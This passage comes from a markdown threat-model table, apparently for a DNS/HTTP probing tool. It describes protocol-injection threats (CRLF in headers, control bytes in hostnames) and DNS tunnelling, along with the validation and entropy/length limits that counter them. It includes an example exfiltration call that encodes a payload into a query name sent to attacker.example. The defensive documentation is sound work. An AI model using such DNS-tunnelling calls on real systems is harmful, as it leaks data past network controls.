...
| **Protocol injection**                          | CRLF in headers, control bytes in hostnames.                                                     | Strict validation in `NormalizeHost` / `NormalizeQueryName` and `applyHeaders`.                                                   |
| **DNS tunnelling / exfiltration**               | `dns_probe("<base32 payload>.attacker.example")` smuggling data out in the queried name.          | The name clears the allow-list like any target; `probes.dns` then caps its total length, its label count, each label's length, and refuses long high-entropy labels when `block_high_entropy_labels` is on. `AXFR` and `ANY` are never valid QTYPEs. Underscored labels are admitted (RFC 8552) — the barrier is the entropy and size budget, not the alphabet. |
